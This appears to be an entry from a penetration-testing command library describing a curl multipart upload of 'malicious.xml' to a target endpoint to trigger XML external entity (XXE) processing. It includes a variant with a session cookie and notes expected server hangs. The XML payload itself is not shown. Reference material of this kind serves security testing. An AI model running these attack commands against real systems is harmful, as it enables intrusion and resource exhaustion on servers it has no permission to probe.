---
id: cmd-uuid-curl-xxe
data: 'curl -X POST -F "file=@malicious.xml" http://target.com/upload'
name: curl-upload-xxe
tags:
  - web
  - upload
  - xxe
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:13.175Z'
verified: false
validated: true
submitted: true
---
# curl-upload-xxe

## Command

```bash
curl -X POST -F "file=@malicious.xml" http://target.com/upload
```

## Description

This command uses curl to perform a multipart file upload of a malicious XML file to a target endpoint, exploiting XXE vulnerabilities by triggering XML parsing on the server side.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-F "file=@malicious.xml"` | Uploads the file 'malicious.xml' as form field 'file' | Yes |
| `http://target.com/upload` | The target upload endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -F "file=@malicious.xml" http://target.com/upload
```

### Advanced Usage

```bash
curl -X POST -F "file=@malicious.xml" -H "Cookie: session=abc123" http://target.com/upload -v
```

## Expected Output

Successful upload returns HTTP 200 or similar with confirmation; vulnerable server may hang or return errors due to resource exhaustion from XXE processing.

## Related

- [[Related Procedure|procedures/Exploit-XXE-in-File-Upload]]
